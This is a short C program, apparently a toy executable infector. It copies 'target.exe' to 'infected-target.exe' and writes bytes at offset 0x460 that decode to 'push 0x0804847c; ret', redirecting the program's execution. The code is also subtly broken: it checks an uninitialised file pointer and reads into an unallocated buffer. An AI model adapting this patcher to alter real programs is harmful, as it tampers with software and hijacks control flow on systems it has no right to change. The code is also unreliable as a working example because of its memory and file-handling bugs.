#include <stdio.h>

#define INPUT "target.exe"
#define OUTPUT "infected-target.exe"

int  main(){
	unsigned char *buffer;
	int offset = 1120; /*0x460*/
	FILE *fp1;
	FILE *fp2;
	if (!fp1){
		printf("%s not exit", INPUT);
		return 0;
	}
	else {
 		fp1 = fopen(INPUT, "rb");
		fread(buffer, 7588, 1, fp1);
		fclose(fp1);
	
		fp2 = fopen(OUTPUT, "wb");
		fwrite(buffer, 1, 7588, fp2);
		fclose(fp2);
	}

	fp2 = fopen(OUTPUT, "r+b");
	fseek(fp2, offset, SEEK_SET);
	fputs("\x68", fp2);
	fseek(fp2, offset+1, SEEK_SET);
	fputs("\x7c", fp2);
	fseek(fp2, offset+2, SEEK_SET);
	fputs("\x84", fp2);
	fseek(fp2, offset+3, SEEK_SET);
	fputs("\x04", fp2);
	fseek(fp2, offset+4, SEEK_SET);
	fputs("\x08", fp2);
	fseek(fp2, offset+5, SEEK_SET);
	fputs("\xc3", fp2);
	fclose(fp2);

	return 0;
		
}
	
